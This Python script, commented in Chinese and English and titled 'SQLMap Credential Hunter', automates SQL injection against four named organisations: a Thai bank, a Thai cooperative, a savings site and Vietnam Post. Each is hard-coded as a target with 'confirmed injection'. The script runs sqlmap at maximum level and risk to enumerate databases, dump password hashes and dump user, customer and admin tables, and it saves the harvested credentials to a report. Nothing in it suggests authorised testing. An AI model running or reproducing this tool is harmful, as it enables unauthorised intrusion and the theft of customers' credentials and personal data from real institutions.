#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SQLMap凭证猎人 - 自动获取数据库凭证
SQLMap Credential Hunter - Automated Database Credential Harvesting

专门用于SQL注入测试并自动提取用户凭证和敏感数据
"""

import subprocess
import json
import re
import os
from datetime import datetime
from pathlib import Path
import threading

class SQLMapCredentialHunter:
    def __init__(self):
        self.hunt_results = []

        # 目标配置 - 优先处理已确认SQL注入的目标
        self.targets = [
            {
                "name": "ThaiVivat Bank",
                "url": "https://thaivivat.co.th",
                "priority": "CRITICAL",
                "confirmed_injection": True,
                "expected_tables": ["users", "customers", "accounts", "employees", "admins"],
                "expected_columns": ["username", "password", "email", "phone", "name", "id"]
            },
            {
                "name": "CM Cooperative",
                "url": "https://cmcoop.or.th",
                "priority": "CRITICAL",
                "confirmed_injection": True,
                "expected_tables": ["members", "users", "customers", "staff"],
                "expected_columns": ["username", "password", "email", "fullname", "user_id"]
            },
            {
                "name": "Mun Saving",
                "url": "https://munsaving.com",
                "priority": "CRITICAL",
                "confirmed_injection": True,
                "expected_tables": ["customers", "users", "accounts", "members"],
                "expected_columns": ["username", "password", "email", "phone", "customer_id"]
            },
            {
                "name": "VN Post",
                "url": "https://vnpost.vn",
                "priority": "HIGH",
                "confirmed_injection": True,
                "expected_tables": ["users", "customers", "staff", "employees"],
                "expected_columns": ["username", "password", "email", "name", "user_id"]
            }
        ]

        # 常见的凭证关键词
        self.credential_keywords = [
            "password", "pwd", "pass", "passwd", "secret", "token", "auth", "login",
            "credential", "user", "username", "email", "phone", "mobile", "tel",
            "admin", "manager", "staff", "employee", "customer", "member"
        ]

    def run_credential_hunt(self, target):
        """运行凭证狩猎任务"""
        print(f"\n[*] 开始凭证狩猎: {target['name']}")

        credential_findings = []

        # 第一步：数据库枚举
        print("  [1] 数据库枚举...")
        db_result = self.enumerate_database(target)
        if db_result:
            credential_findings.extend(db_result)

        # 第二步：用户表识别和转储
        print("  [2] 用户表识别和转储...")
        user_tables = self.dump_user_tables(target)
        if user_tables:
            credential_findings.extend(user_tables)

        # 第三步：管理员表转储
        print("  [3] 管理员表转储...")
        admin_creds = self.dump_admin_credential(target)
        if admin_creds:
            credential_findings.extend(admin_creds)

        # 第四步：凭证关键词搜索
        print("  [4] 凭证关键词搜索...")
        keyword_search = self.search_for_keywords(target)
        if keyword_search:
            credential_findings.extend(keyword_search)

        # 第五步：模糊测试参数发现隐藏注入点
        print("  [5] 模糊测试参数发现...")
        fuzzing_results = self.fuzz_parameters(target)
        if fuzzing_results:
            credential_findings.extend(fuzzing_results)

        result = {
            "target": target,
            "hunt_timestamp": datetime.now().isoformat(),
            "findings": credential_findings,
            "total_credentials": len([f for f in credential_findings if f.get("type") == "credential"]),
            "risk_score": self.calculate_risk_score(credential_findings)
        }

        self.hunt_results.append(result)
        return result

    def enumerate_database(self, target):
        """枚举数据库信息"""
        cmd = [
            "sqlmap",
            "-u", target["url"],
            "--batch",
            "--level=5",
            "--risk=3",
            "--dbs",
            "--columns",
            "--current-user",
            "--current-db",
            "--is-dba",
            "--users",
            "--passwords",
            "--threads=5",
            "--timeout=30"
        ]

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=180
            )

            findings = []
            if result.returncode == 0:
                output = result.stdout

                # 提取当前用户和数据库
                current_user = self.extract_value(output, "current user:")
                current_db = self.extract_value(output, "current database:")
                is_dba = "currently running as DBA" in output.lower()

                if current_user:
                    findings.append({
                        "type": "database_info",
                        "category": "user_info",
                        "data": f"Current User: {current_user}",
                        "sensitivity": "HIGH"
                    })

                if current_db:
                    findings.append({
                        "type": "database_info",
                        "category": "database_info",
                        "data": f"Current Database: {current_db}",
                        "sensitivity": "MEDIUM"
                    })

                if is_dba:
                    findings.append({
                        "type": "privilege_info",
                        "category": "admin_access",
                        "data": "Database Administrator Access Confirmed",
                        "sensitivity": "CRITICAL"
                    })

            return findings

        except Exception as e:
            print(f"  [!] 数据库枚举失败: {e}")
            return None

    def dump_user_tables(self, target):
        """转储用户表数据"""
        findings = []

        # 预期的用户表模式
        table_patterns = [
            "users", "customers", "members", "accounts", "customers",
            "client", "clients", "clients_list", "users_table", "customer_data"
        ]

        # 常见的用户表列名模式
        column_patterns = [
            ("username", "user_name", "login", "email", "user_id"),
            ("password", "pwd", "passwd", "pass", "password_hash", "password_encrypted"),
            ("email", "email_address", "contact_email", "e_mail"),
            ("phone", "phone_number", "mobile", "tel", "contact_phone"),
            ("name", "full_name", "first_name", "last_name", "fullname"),
            ("status", "active", "enabled", "verified"),
            ("created", "created_at", "registration_date", "date_created")
        ]

        for table_pattern in table_patterns:
            cmd = [
                "sqlmap",
                "-u", target["url"],
                "--batch",
                "--level=5",
                "--risk=3",
                "--table", table_pattern,
                "--columns",
                "--dump",
                "--threads=3",
                "--timeout=30"
            ]

            try:
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=120
                )

                if result.returncode == 0 and result.stdout:
                    table_data = self.extract_table_data(result.stdout, table_pattern)
                    if table_data:
                        findings.extend(table_data)

            except Exception as e:
                print(f"  [!] 转储表 {table_pattern} 失败: {e}")
                continue

        return findings

    def dump_admin_credential(self, target):
        """转储管理员凭证"""
        findings = []

        # 管理员表和列名
        admin_tables = ["admins", "admin", "manager", "superuser", "system_admin", "administrator"]
        admin_columns = ["admin", "manager", "administrator", "superuser", "root", "admin_name", "admin_user"]

        for admin_table in admin_tables:
            for admin_col in admin_columns:
                cmd = [
                    "sqlmap",
                    "-u", target["url"],
                    "--batch",
                    "--level=5",
                    "--risk=3",
                    "--dump",
                    "-T", admin_table,
                    "-C", f"{admin_col},password,pwd,passwd",
                    "--threads=3",
                    "--timeout=30"
                ]

                try:
                    result = subprocess.run(
                        cmd,
                        capture_output=True,
                        text=True,
                        timeout=90
                    )

                    if result.returncode == 0 and result.stdout:
                        admin_creds = self.extract_admin_credentials(result.stdout, admin_table, admin_col)
                        if admin_creds:
                            findings.extend(admin_creds)

                except Exception as e:
                    print(f"  [!] 转储管理员凭证 {admin_table} 失败: {e}")
                    continue

        return findings

    def search_for_keywords(self, target):
        """搜索凭证相关关键词"""
        findings = []

        for keyword in self.credential_keywords:
            cmd = [
                "sqlmap",
                "-u", target["url"],
                "--batch",
                "--level=3",
                "--risk=2",
                "--dump",
                "--search", keyword,
                "--threads=2",
                "--timeout=20"
            ]

            try:
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=60
                )

                if result.returncode == 0 and result.stdout:
                    keyword_results = self.extract_keyword_results(result.stdout, keyword)
                    if keyword_results:
                        findings.extend(keyword_results)

            except Exception as e:
                continue

        return findings

    def fuzz_parameters(self, target):
        """模糊测试参数发现隐藏注入点"""
        findings = []

        # 常见的用户输入参数
        common_params = ["id", "user_id", "client_id", "customer_id", "member_id",
                        "search", "query", "keyword", "param", "input", "data",
                        "username", "email", "phone", "mobile", "tel"]

        for param in common_params[:10]:  # 限制数量避免过长时间
            cmd = [
                "sqlmap",
                "-u", target["url"],
                "-p", param,
                "--batch",
                "--level=3",
                "--risk=2",
                "--technique=B,--Q,S,T,U",
                "--threads=2",
                "--timeout=15"
            ]

            try:
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=30
                )

                if result.returncode == 0 and any(vuln in result.stdout.lower() for vuln in ["injectable", "vulnerable", "sql injection"]):
                    findings.append({
                        "type": "injection_point",
                        "category": "parameter_discovery",
                        "data": f"发现参数注入: {param}",
                        "sensitivity": "MEDIUM"
                    })

            except Exception as e:
                continue

        return findings

    def extract_table_data(self, output, table_name):
        """提取表数据"""
        findings = []

        # 查找用户名和密码字段
        username_pattern = re.compile(r'username|user_name|login|email', re.IGNORECASE)
        password_pattern = re.compile(r'password|pwd|passwd|pass', re.IGNORECASE)

        # 简单的数据提取（实际应用中需要更复杂的解析）
        if table_name in output.lower():
            lines = output.split('\n')
            for line in lines:
                if username_pattern.search(line) and (password_pattern.search(output)):
                    findings.append({
                        "type": "table_structure",
                        "category": "credential_schema",
                        "data": f"表 {table_name} 包含凭证字段: {line.strip()}",
                        "sensitivity": "MEDIUM"
                    })

        return findings

    def extract_admin_credentials(self, output, table_name, admin_col):
        """提取管理员凭证"""
        findings = []

        # 查找管理员用户名和密码
        admin_pattern = re.compile(r'admin|manager|administrator|superuser', re.IGNORECASE)
        password_pattern = re.compile(r'[a-f0-9]{32}|[A-F0-9]{32}|[a-f0-9]{40}|[A-F0-9]{40}', re.IGNORECASE)

        lines = output.split('\n')
        for line in lines:
            if admin_pattern.search(line):
                finding = {
                    "type": "credential",
                    "category": "admin_access",
                    "table": table_name,
                    "data": f"发现管理员凭证: {line.strip()}",
                    "sensitivity": "CRITICAL"
                }
                findings.append(finding)

        return findings

    def extract_keyword_results(self, output, keyword):
        """提取关键词搜索结果"""
        findings = []

        # 查找包含关键词的行
        lines = output.split('\n')
        for line in lines:
            if keyword.lower() in line.lower() and len(line.strip()) > 0:
                findings.append({
                    "type": "keyword_match",
                    "category": "credential_discovery",
                    "keyword": keyword,
                    "data": line.strip(),
                    "sensitivity": "LOW"
                })

        return findings

    def extract_value(self, output, pattern):
        """提取特定值"""
        match = re.search(rf'{pattern}[:\s]*([^\n]+)', output, re.IGNORECASE)
        return match.group(1).strip() if match else None

    def calculate_risk_score(self, findings):
        """计算风险评分"""
        risk_score = 0
        for finding in findings:
            if finding.get("sensitivity") == "CRITICAL":
                risk_score += 100
            elif finding.get("sensitivity") == "HIGH":
                risk_score += 50
            elif finding.get("sensitivity") == "MEDIUM":
                risk_score += 25
            elif finding.get("sensitivity") == "LOW":
                risk_score += 10

        return min(risk_score, 1000)  # 限制最大得分

    def generate_credential_report(self):
        """生成凭证狩猎报告"""
        print("\n" + "="*70)
        print("SQLMap凭证狩猎报告")
        print("SQLMap Credential Hunter Report")
        print("="*70)

        total_targets = len(self.targets)
        total_findings = sum(len(result.get("findings", [])) for result in self.hunt_results)
        total_credentials = sum(result.get("total_credentials", 0) for result in self.hunt_results)

        high_risk_targets = len([r for r in self.hunt_results if r.get("risk_score", 0) > 200])

        print(f"\n[狩猎统计]")
        print(f"目标总数: {total_targets}")
        print(f"已扫描目标: {len(self.hunt_results)}")
        print(f"发现总数量: {total_findings}")
        print(f"凭证总数: {total_credentials}")
        print(f"高风险目标: {high_risk_targets}")

        print(f"\n[详细发现]")
        for i, result in enumerate(self.hunt_results, 1):
            target_name = result["target"]["name"]
            risk_score = result.get("risk_score", 0)

            print(f"\n{i}. {target_name}")
            print(f"   风险评分: {risk_score}/1000")
            print(f"   发现数量: {len(result.get('findings', []))}")
            print(f"   凭证数量: {result.get('total_credentials', 0)}")

            for j, finding in enumerate(result.get('findings', [])[:5], 1):  # 显示前5个发现
                print(f"      {j}. [{finding.get('sensitivity', 'LOW')}] {finding.get('data', 'N/A')}")

        # 保存详细报告
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_filename = f"sqlmap_credential_hunt_{timestamp}.json"

        try:
            with open(report_filename, 'w', encoding='utf-8') as f:
                json.dump({
                    "report_type": "sqlmap_credential_hunt",
                    "timestamp": timestamp,
                    "summary": {
                        "total_targets": total_targets,
                        "scanned_targets": len(self.hunt_results),
                        "total_findings": total_findings,
                        "total_credentials": total_credentials,
                        "high_risk_targets": high_risk_targets
                    },
                    "results": self.hunt_results
                }, f, ensure_ascii=False, indent=2)

            print(f"\n[SUCCESS] 详细报告已保存: {report_filename}")
            return report_filename
        except Exception as e:
            print(f"\n[ERROR] 保存报告失败: {e}")
            return None

    def run_comprehensive_hunt(self):
        """运行综合凭证狩猎"""
        print("="*70)
        print("SQLMap凭证猎人 - 开始狩猎")
        print("SQLMap Credential Hunter - Starting Hunt")
        print("="*70)

        for target in self.targets:
            print(f"\n[目标] {target['name']} ({target['url']})")
            print(f"[优先级] {target['priority']}")

            result = self.run_credential_hunt(target)
            if result:
                risk_score = result.get("risk_score", 0)
                print(f"[完成] 风险评分: {risk_score}/1000")
                print(f"[发现] 凭证数量: {result.get('total_credentials', 0)}")

        print(f"\n[狩猎完成] 共处理 {len(self.targets)} 个目标")
        return self.generate_credential_report()

def main():
    """主函数"""
    print("SQLMap凭证猎人 - 自动获取数据库凭证")
    print("SQLMap Credential Hunter - Automated Database Credential Harvesting")

    hunter = SQLMapCredentialHunter()
    report = hunter.run_comprehensive_hunt()

    print("\n[凭证狩猎完成]！")
    return report

if __name__ == "__main__":
    main()